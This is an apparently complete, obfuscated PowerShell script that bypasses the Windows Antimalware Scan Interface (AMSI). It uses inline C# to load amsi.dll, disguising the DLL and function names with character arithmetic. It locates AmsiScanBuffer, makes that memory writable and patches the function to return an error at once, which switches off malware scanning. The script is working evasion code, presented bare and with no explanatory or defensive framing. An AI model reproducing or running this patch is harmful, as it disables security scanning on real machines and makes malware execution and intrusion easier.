$w_GYTppM4 = @"
using System;
using System.Runtime.InteropServices;
public class w_GYTppM4 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr wJTS4ICT, string GRx6lkO);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr NEqx7Dne, UIntPtr MXKh6Aeve6AIiSj, uint tHfZiit, out uint f1mTUi);
}
"@

Add-Type $w_GYTppM4

$I3P6ljIaihSs10 = [w_GYTppM4]::LoadLibrary("$(('âm'+'sì'+'.d'+'ll').norMalIZE([ChaR](70*64/64)+[Char]([bytE]0x6f)+[cHAr](114)+[Char](109+21-21)+[cHAr](68+51-51)) -replace [CHAR](92*80/80)+[CHAR](112+36-36)+[CHar]([byTe]0x7b)+[char]([BytE]0x4d)+[CHaR](72+38)+[chAR](125))")
$EOr4vOH1KE1jfxvO4 = [w_GYTppM4]::GetProcAddress($I3P6ljIaihSs10, "$([chAr](15+50)+[cHAr](29+80)+[cHaR]([BYTE]0x73)+[CHar]([ByTE]0x69)+[CHAR]([bYtE]0x53)+[cHaR]([byTE]0x63)+[cHAr](97*7/7)+[chaR](79+31)+[chAr](66)+[Char](117+6-6)+[cHAr]([ByTE]0x66)+[CHar](102*100/100)+[ChAr]([bytE]0x65)+[CHaR](107+7))")
$p = 0
[w_GYTppM4]::VirtualProtect($EOr4vOH1KE1jfxvO4, [uint32]5, 0x40, [ref]$p)
$Pvu6c_t2fFq56X = "0xB8"
$TtuWed2GWM1H4zGM9VE = "0x57"
$fB1M = "0x00"
$YN_uqsV1lr_ = "0x07"
$ZiGP989ZsjewQ1vz = "0x80"
$UC0 = "0xC3"
$oiPWHEBncQ50bP5O = [Byte[]] ($Pvu6c_t2fFq56X,$TtuWed2GWM1H4zGM9VE,$fB1M,$YN_uqsV1lr_,+$ZiGP989ZsjewQ1vz,+$UC0)
[System.Runtime.InteropServices.Marshal]::Copy($oiPWHEBncQ50bP5O, 0, $EOr4vOH1KE1jfxvO4, 6)